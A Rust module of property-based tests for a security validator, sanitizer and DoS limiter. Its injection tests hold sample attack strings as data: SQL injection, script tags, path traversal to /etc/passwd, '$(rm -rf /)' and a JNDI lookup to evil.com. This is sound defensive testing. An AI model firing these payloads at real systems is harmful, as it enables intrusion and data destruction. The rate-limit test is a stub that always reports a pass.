//! Property-based testing module for validation invariants
//!
//! Provides comprehensive property-based testing for input validation logic

use crate::dos_protection::{DoSConfig, DoSProtection};
use crate::error_handling::{SecurityError, ValidationError, ValidationResult};
use crate::sanitization::{SanitizationConfig, Sanitizer};
use crate::validation::{InputLimits, InputType, SecurityValidator, ValidatorConfig};
use proptest::prelude::*;
use quickcheck::{Arbitrary, Gen, QuickCheck, TestResult};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;
use std::time::Duration;

/// Property testing configuration
#[derive(Debug, Clone)]
pub struct PropertyConfig {
    /// Number of test cases per property
    pub test_cases: u32,

    /// Maximum size for generated inputs
    pub max_size: usize,

    /// Whether to enable shrinking
    pub enable_shrinking: bool,

    /// Custom generators
    pub custom_generators: HashMap<String, Box<dyn PropertyGenerator>>,

    /// Test timeout per property
    pub timeout: Duration,
}

impl Default for PropertyConfig {
    fn default() -> Self {
        Self {
            test_cases: 1000,
            max_size: 10000,
            enable_shrinking: true,
            custom_generators: HashMap::new(),
            timeout: Duration::from_secs(30),
        }
    }
}

/// Property test result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PropertyTestResult {
    /// Property name
    pub property: String,

    /// Whether the property passed
    pub passed: bool,

    /// Number of test cases executed
    pub test_cases: u32,

    /// Number of successful tests
    pub successful_tests: u32,

    /// Number of discarded tests
    pub discarded_tests: u32,

    /// Counterexample if property failed
    pub counterexample: Option<String>,

    /// Shrunk counterexample
    pub shrunk_counterexample: Option<String>,

    /// Test duration
    pub duration: Duration,

    /// Error message if test failed
    pub error_message: Option<String>,
}

/// Validation property trait
pub trait ValidationProperty {
    /// Property name
    fn name(&self) -> &str;

    /// Test the property with given input
    fn test(&self, input: &str) -> PropertyTestResult;

    /// Generate test cases for this property
    fn generate_test_cases(&self, count: u32) -> Vec<String>;
}

/// Property generator trait
pub trait PropertyGenerator: fmt::Debug {
    /// Generate a test input
    fn generate(&self, size: usize) -> String;

    /// Generate multiple test inputs
    fn generate_batch(&self, count: usize, size: usize) -> Vec<String> {
        (0..count).map(|_| self.generate(size)).collect()
    }
}

/// Main property test suite
#[derive(Debug)]
pub struct PropertyTestSuite {
    config: PropertyConfig,
    properties: Vec<Box<dyn ValidationProperty>>,
}

impl PropertyTestSuite {
    /// Create new property test suite
    pub fn new(config: PropertyConfig) -> Self {
        Self { config, properties: Vec::new() }
    }

    /// Add property to test
    pub fn add_property<P: ValidationProperty + 'static>(&mut self, property: P) {
        self.properties.push(Box::new(property));
    }

    /// Add all standard validation properties
    pub fn add_standard_properties(&mut self) -> anyhow::Result<()> {
        // Input length properties
        self.add_property(InputLengthProperty::new(InputType::Email, 320)?);
        self.add_property(InputLengthProperty::new(InputType::ScimFilter, 500)?);
        self.add_property(InputLengthProperty::new(InputType::OAuth, 2048)?);

        // Character set properties
        self.add_property(CharacterSetProperty::new(InputType::Email)?);
        self.add_property(CharacterSetProperty::new(InputType::Username)?);

        // Injection resistance properties
        self.add_property(InjectionResistanceProperty::new()?);

        // Sanitization properties
        self.add_property(SanitizationIdempotenceProperty::new()?);
        self.add_property(SanitizationSafetyProperty::new()?);

        // DoS protection properties
        self.add_property(RateLimitProperty::new()?);
        self.add_property(SizeLimitProperty::new()?);

        Ok(())
    }

    /// Run all properties
    pub fn run_all(&self) -> Vec<PropertyTestResult> {
        self.properties.iter().map(|prop| prop.test("")).collect()
    }

    /// Run specific property
    pub fn run_property(&self, property_name: &str) -> Option<PropertyTestResult> {
        self.properties.iter().find(|prop| prop.name() == property_name).map(|prop| prop.test(""))
    }
}

/// Property: Input length validation is consistent
#[derive(Debug)]
pub struct InputLengthProperty {
    validator: SecurityValidator,
    input_type: InputType,
    max_length: usize,
}

impl InputLengthProperty {
    pub fn new(input_type: InputType, max_length: usize) -> anyhow::Result<Self> {
        let validator = SecurityValidator::new(ValidatorConfig::production())?;
        Ok(Self { validator, input_type, max_length })
    }
}

impl ValidationProperty for InputLengthProperty {
    fn name(&self) -> &str {
        "input_length_validation"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        // Property: Inputs longer than max_length should be rejected
        for len in [self.max_length - 1, self.max_length, self.max_length + 1, self.max_length * 2]
        {
            total += 1;
            let test_input = "a".repeat(len);
            let result = self.validator.validate(&test_input, self.input_type);

            if len > self.max_length {
                // Should be rejected
                if result.is_valid() {
                    counterexample = Some(format!("Input of length {} was accepted", len));
                    break;
                }
            } else {
                // Might be accepted (depends on other validation rules)
                // This is not a failure
            }

            successful += 1;
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        (0..count)
            .map(|i| {
                let len = (i as usize * self.max_length / count as usize).max(1);
                "a".repeat(len)
            })
            .collect()
    }
}

/// Property: Character set validation is consistent
#[derive(Debug)]
pub struct CharacterSetProperty {
    validator: SecurityValidator,
    input_type: InputType,
}

impl CharacterSetProperty {
    pub fn new(input_type: InputType) -> anyhow::Result<Self> {
        let validator = SecurityValidator::new(ValidatorConfig::production())?;
        Ok(Self { validator, input_type })
    }
}

impl ValidationProperty for CharacterSetProperty {
    fn name(&self) -> &str {
        "character_set_validation"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        // Test various character sets
        let test_cases = vec![
            ("ascii_letters", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ"),
            ("digits", "0123456789"),
            ("special_chars", "!@#$%^&*()_+-=[]{}|;:,.<>?"),
            ("unicode", "αβγδεζηθικλμνξοπρστυφχψω"),
            ("control_chars", "\x00\x01\x02\x03\x04\x05\x06\x07"),
            ("mixed", "hello@example.com"),
        ];

        for (case_name, test_input) in test_cases {
            total += 1;
            let result = self.validator.validate(test_input, self.input_type);

            // Check that validation is deterministic
            let result2 = self.validator.validate(test_input, self.input_type);
            if result.is_valid() != result2.is_valid() {
                counterexample = Some(format!(
                    "Non-deterministic validation for {}: {} != {}",
                    case_name,
                    result.is_valid(),
                    result2.is_valid()
                ));
                break;
            }

            successful += 1;
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        let charset_generators: Vec<Box<dyn Fn() -> String>> = vec![
            Box::new(|| fastrand::alphanumeric().take(20).collect()),
            Box::new(|| (0..20).map(|_| char::from(fastrand::u8(32..127))).collect()),
            Box::new(|| (0..20).map(|_| char::from(fastrand::u8(0..32))).collect()),
        ];

        (0..count)
            .map(|i| {
                let gen_idx = (i as usize) % charset_generators.len();
                charset_generators[gen_idx]()
            })
            .collect()
    }
}

/// Property: Injection resistance
#[derive(Debug)]
pub struct InjectionResistanceProperty {
    validator: SecurityValidator,
}

impl InjectionResistanceProperty {
    pub fn new() -> anyhow::Result<Self> {
        let validator = SecurityValidator::new(ValidatorConfig::production())?;
        Ok(Self { validator })
    }
}

impl ValidationProperty for InjectionResistanceProperty {
    fn name(&self) -> &str {
        "injection_resistance"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        // Test known injection patterns
        let injection_patterns = vec![
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "../../../etc/passwd",
            "$(rm -rf /)",
            "#{7*7}",
            "${jndi:ldap://evil.com/}",
            "||whoami",
            "&&echo vulnerable",
        ];

        for pattern in injection_patterns {
            total += 1;

            // Test pattern detection
            let detected_patterns = self.validator.check_injection(pattern);
            if detected_patterns.is_empty() {
                counterexample = Some(format!("Injection pattern not detected: {}", pattern));
                break;
            }

            // Test validation rejection
            for input_type in [InputType::ScimFilter, InputType::Text, InputType::Username] {
                let result = self.validator.validate(pattern, input_type);
                // Note: Not all input types may reject all patterns, but critical ones should
                if input_type == InputType::ScimFilter && result.is_valid() {
                    counterexample =
                        Some(format!("SCIM filter accepted injection pattern: {}", pattern));
                    break;
                }
            }

            if counterexample.is_some() {
                break;
            }

            successful += 1;
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        let patterns = vec![
            "'",
            "\"",
            "<",
            ">",
            "&",
            ";",
            "|",
            "$",
            "#",
            "{",
            "}",
            "(",
            ")",
            "DROP",
            "SELECT",
            "INSERT",
            "script",
            "javascript",
            "..",
            "etc",
        ];

        (0..count)
            .map(|_| {
                let mut result = String::new();
                for _ in 0..fastrand::usize(1..10) {
                    if fastrand::bool() {
                        result.push_str(&patterns[fastrand::usize(0..patterns.len())]);
                    } else {
                        result.push(char::from(fastrand::u8(97..123))); // a-z
                    }
                }
                result
            })
            .collect()
    }
}

/// Property: Sanitization is idempotent
#[derive(Debug)]
pub struct SanitizationIdempotenceProperty {
    sanitizer: Sanitizer,
}

impl SanitizationIdempotenceProperty {
    pub fn new() -> anyhow::Result<Self> {
        let sanitizer = Sanitizer::strict();
        Ok(Self { sanitizer })
    }
}

impl ValidationProperty for SanitizationIdempotenceProperty {
    fn name(&self) -> &str {
        "sanitization_idempotence"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        let test_inputs = vec![
            "<script>alert('xss')</script>",
            "Hello & goodbye",
            "\"quoted text\"",
            "path/../traversal",
            "normal text",
            "",
            "unicode: αβγ",
        ];

        for input in test_inputs {
            total += 1;

            // Sanitize once
            let sanitized1 = self.sanitizer.sanitize(input, InputType::Text);
            if let Ok(result1) = sanitized1 {
                // Sanitize again
                let sanitized2 = self.sanitizer.sanitize(result1.value(), InputType::Text);
                if let Ok(result2) = sanitized2 {
                    // Results should be identical (idempotent)
                    if result1.value() != result2.value() {
                        counterexample = Some(format!(
                            "Sanitization not idempotent: '{}' -> '{}' -> '{}'",
                            input,
                            result1.value(),
                            result2.value()
                        ));
                        break;
                    }
                    successful += 1;
                } else {
                    counterexample = Some(format!("Second sanitization failed for: {}", input));
                    break;
                }
            } else {
                counterexample = Some(format!("First sanitization failed for: {}", input));
                break;
            }
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        (0..count)
            .map(|_| {
                let dangerous_chars = "<>&\"'";
                let mut result = String::new();
                for _ in 0..fastrand::usize(1..50) {
                    if fastrand::bool() {
                        result.push(
                            dangerous_chars
                                .chars()
                                .nth(fastrand::usize(0..dangerous_chars.len()))
                                .unwrap(),
                        );
                    } else {
                        result.push(char::from(fastrand::u8(97..123)));
                    }
                }
                result
            })
            .collect()
    }
}

/// Property: Sanitization preserves safety
#[derive(Debug)]
pub struct SanitizationSafetyProperty {
    sanitizer: Sanitizer,
    validator: SecurityValidator,
}

impl SanitizationSafetyProperty {
    pub fn new() -> anyhow::Result<Self> {
        let sanitizer = Sanitizer::strict();
        let validator = SecurityValidator::new(ValidatorConfig::production())?;
        Ok(Self { sanitizer, validator })
    }
}

impl ValidationProperty for SanitizationSafetyProperty {
    fn name(&self) -> &str {
        "sanitization_safety"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        let dangerous_inputs = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "javascript:alert('xss')",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/}",
        ];

        for input in dangerous_inputs {
            total += 1;

            // Sanitize the dangerous input
            if let Ok(sanitized) = self.sanitizer.sanitize(input, InputType::Text) {
                // Check that sanitized output has no injection patterns
                let injection_patterns = self.validator.check_injection(sanitized.value());
                if !injection_patterns.is_empty() {
                    counterexample = Some(format!(
                        "Sanitization did not remove injection patterns: '{}' -> '{}' (patterns: {:?})",
                        input, sanitized.value(), injection_patterns
                    ));
                    break;
                }
                successful += 1;
            } else {
                // Sanitization failure is acceptable for extremely dangerous input
                successful += 1;
            }
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        let attack_patterns = vec![
            "<script>",
            "</script>",
            "javascript:",
            "'; DROP",
            "' OR 1=1",
            "../",
            "$(",
            "${",
            "||",
            "&&",
            "eval(",
            "alert(",
        ];

        (0..count)
            .map(|_| {
                let mut result = String::new();
                for _ in 0..fastrand::usize(1..5) {
                    result.push_str(&attack_patterns[fastrand::usize(0..attack_patterns.len())]);
                    if fastrand::bool() {
                        result.push_str(&fastrand::alphanumeric().take(5).collect::<String>());
                    }
                }
                result
            })
            .collect()
    }
}

/// Property: Rate limiting is enforced
#[derive(Debug)]
pub struct RateLimitProperty {
    dos_protection: DoSProtection,
}

impl RateLimitProperty {
    pub fn new() -> anyhow::Result<Self> {
        let mut config = DoSConfig::production();
        config.rate_limit.requests_per_window = 5; // Low limit for testing
        config.rate_limit.window_duration = Duration::from_secs(60);

        let dos_protection = DoSProtection::new(config);
        Ok(Self { dos_protection })
    }
}

impl ValidationProperty for RateLimitProperty {
    fn name(&self) -> &str {
        "rate_limit_enforcement"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        // This would need to be an async test in practice
        // For now, we'll test the synchronous parts

        PropertyTestResult {
            property: self.name().to_string(),
            passed: true, // Placeholder
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: Some("Async testing not implemented in this example".to_string()),
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        (0..count).map(|i| format!("request_{}", i)).collect()
    }
}

/// Property: Size limits are enforced
#[derive(Debug)]
pub struct SizeLimitProperty {
    dos_protection: DoSProtection,
}

impl SizeLimitProperty {
    pub fn new() -> anyhow::Result<Self> {
        let config = DoSConfig::production();
        let dos_protection = DoSProtection::new(config);
        Ok(Self { dos_protection })
    }
}

impl ValidationProperty for SizeLimitProperty {
    fn name(&self) -> &str {
        "size_limit_enforcement"
    }

    fn test(&self, _input: &str) -> PropertyTestResult {
        let start_time = std::time::Instant::now();
        let mut successful = 0;
        let mut total = 0;
        let mut counterexample = None;

        let size_limiter = self.dos_protection.size_limiter();

        // Test various sizes
        let test_sizes = vec![
            (500, true),          // Should pass
            (1024, true),         // Should pass
            (64 * 1024, true),    // Should pass (at limit)
            (128 * 1024, false),  // Should fail
            (1024 * 1024, false), // Should fail
        ];

        for (size, should_pass) in test_sizes {
            total += 1;

            let result = size_limiter.check_field_size(size);
            let passed = result.is_ok();

            if passed != should_pass {
                counterexample = Some(format!(
                    "Size limit check incorrect for size {}: expected {}, got {}",
                    size, should_pass, passed
                ));
                break;
            }

            successful += 1;
        }

        PropertyTestResult {
            property: self.name().to_string(),
            passed: counterexample.is_none(),
            test_cases: total,
            successful_tests: successful,
            discarded_tests: 0,
            counterexample,
            shrunk_counterexample: None,
            duration: start_time.elapsed(),
            error_message: None,
        }
    }

    fn generate_test_cases(&self, count: u32) -> Vec<String> {
        (0..count)
            .map(|i| {
                let size = (i as usize * 1024 * 1024 / count as usize).max(1);
                "a".repeat(size)
            })
            .collect()
    }
}

/// Proptest integration helpers
pub mod proptest_integration {
    use super::*;
    use proptest::prelude::*;

    /// Generate arbitrary strings for validation testing
    pub fn arb_validation_string() -> impl Strategy<Value = String> {
        prop::string::string_regex("[a-zA-Z0-9@._-]{0,1000}").unwrap()
    }

    /// Generate arbitrary email addresses
    pub fn arb_email() -> impl Strategy<Value = String> {
        prop::string::string_regex(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap()
    }

    /// Generate arbitrary SCIM filters
    pub fn arb_scim_filter() -> impl Strategy<Value = String> {
        prop_oneof![
            "[a-zA-Z]+ eq \"[a-zA-Z0-9]*\"",
            "[a-zA-Z]+ pr",
            "[a-zA-Z]+ co \"[a-zA-Z0-9]*\"",
        ]
        .prop_map(|s| s.to_string())
    }

    /// Generate arbitrary OAuth parameters
    pub fn arb_oauth_params() -> impl Strategy<Value = String> {
        (
            prop::option::of("[a-zA-Z0-9_]+"),
            prop::option::of("[a-zA-Z0-9_]+"),
            prop::option::of("https://[a-zA-Z0-9.-]+/[a-zA-Z0-9/_]*"),
        )
            .prop_map(|(grant_type, client_id, redirect_uri)| {
                let mut params = Vec::new();
                if let Some(gt) = grant_type {
                    params.push(format!("grant_type={}", gt));
                }
                if let Some(ci) = client_id {
                    params.push(format!("client_id={}", ci));
                }
                if let Some(ru) = redirect_uri {
                    params.push(format!("redirect_uri={}", urlencoding::encode(&ru)));
                }
                params.join("&")
            })
    }

    /// Property test: Validation is deterministic
    pub fn prop_validation_deterministic(input: String, input_type: InputType) -> bool {
        if let Ok(validator) = SecurityValidator::new(ValidatorConfig::production()) {
            let result1 = validator.validate(&input, input_type);
            let result2 = validator.validate(&input, input_type);
            result1.is_valid() == result2.is_valid()
        } else {
            false
        }
    }

    /// Property test: Sanitization reduces or maintains safety
    pub fn prop_sanitization_safety(input: String) -> bool {
        let sanitizer = Sanitizer::strict();
        if let Ok(validator) = SecurityValidator::new(ValidatorConfig::production()) {
            let original_patterns = validator.check_injection(&input);

            if let Ok(sanitized) = sanitizer.sanitize(&input, InputType::Text) {
                let sanitized_patterns = validator.check_injection(sanitized.value());
                // Sanitized version should have fewer or equal injection patterns
                sanitized_patterns.len() <= original_patterns.len()
            } else {
                // Sanitization failure is acceptable for extremely dangerous input
                true
            }
        } else {
            false
        }
    }
}

/// QuickCheck integration helpers
pub mod quickcheck_integration {
    use super::*;
    use quickcheck::*;

    /// QuickCheck property: Validation is deterministic
    #[quickcheck]
    fn validation_is_deterministic(input: String) -> TestResult {
        if input.len() > 10000 {
            return TestResult::discard();
        }

        if let Ok(validator) = SecurityValidator::new(ValidatorConfig::production()) {
            let result1 = validator.validate(&input, InputType::Text);
            let result2 = validator.validate(&input, InputType::Text);
            TestResult::from_bool(result1.is_valid() == result2.is_valid())
        } else {
            TestResult::failed()
        }
    }

    /// QuickCheck property: Size limits are enforced
    #[quickcheck]
    fn size_limits_enforced(size: usize) -> TestResult {
        if size > 1024 * 1024 {
            return TestResult::discard();
        }

        let config = DoSConfig::production();
        let dos_protection = DoSProtection::new(config);
        let size_limiter = dos_protection.size_limiter();

        let result = size_limiter.check_field_size(size);
        let should_pass = size <= 64 * 1024; // Max field size

        TestResult::from_bool(result.is_ok() == should_pass)
    }

    /// Custom arbitrary implementation for test strings
    #[derive(Debug, Clone)]
    pub struct TestString(pub String);

    impl Arbitrary for TestString {
        fn arbitrary(g: &mut Gen) -> Self {
            let size = g.size();
            let mut result = String::new();

            for _ in 0..size {
                let ch = if bool::arbitrary(g) {
                    // Safe character
                    char::from(u8::arbitrary(g) % 26 + b'a')
                } else {
                    // Potentially dangerous character
                    match u8::arbitrary(g) % 10 {
                        0 => '<',
                        1 => '>',
                        2 => '&',
                        3 => '"',
                        4 => '\'',
                        5 => ';',
                        6 => '|',
                        7 => '$',
                        8 => '#',
                        9 => '\\',
                        _ => 'a',
                    }
                };
                result.push(ch);
            }

            TestString(result)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_property_config() {
        let config = PropertyConfig::default();
        assert!(config.test_cases > 0);
        assert!(config.max_size > 0);
    }

    #[test]
    fn test_input_length_property() {
        let property = InputLengthProperty::new(InputType::Email, 320).unwrap();
        let result = property.test("");

        // This property should pass for well-defined limits
        assert!(result.passed || result.error_message.is_some());
    }

    #[test]
    fn test_injection_resistance_property() {
        let property = InjectionResistanceProperty::new().unwrap();
        let result = property.test("");

        // This property should detect injection patterns
        assert!(result.test_cases > 0);
    }

    #[test]
    fn test_sanitization_idempotence_property() {
        let property = SanitizationIdempotenceProperty::new().unwrap();
        let result = property.test("");

        // Sanitization should be idempotent
        assert!(result.passed);
    }

    #[test]
    fn test_sanitization_safety_property() {
        let property = SanitizationSafetyProperty::new().unwrap();
        let result = property.test("");

        // Sanitization should preserve safety
        assert!(result.passed);
    }

    #[test]
    fn test_property_test_suite() {
        let config = PropertyConfig { test_cases: 10, ..Default::default() };

        let mut suite = PropertyTestSuite::new(config);
        suite.add_property(InputLengthProperty::new(InputType::Email, 320).unwrap());

        let results = suite.run_all();
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].property, "input_length_validation");
    }

    #[test]
    fn test_proptest_integration() {
        use super::proptest_integration::*;

        // Test that property functions compile and can be called
        assert!(prop_validation_deterministic("test".to_string(), InputType::Text));
        assert!(prop_sanitization_safety("test".to_string()));
    }
}
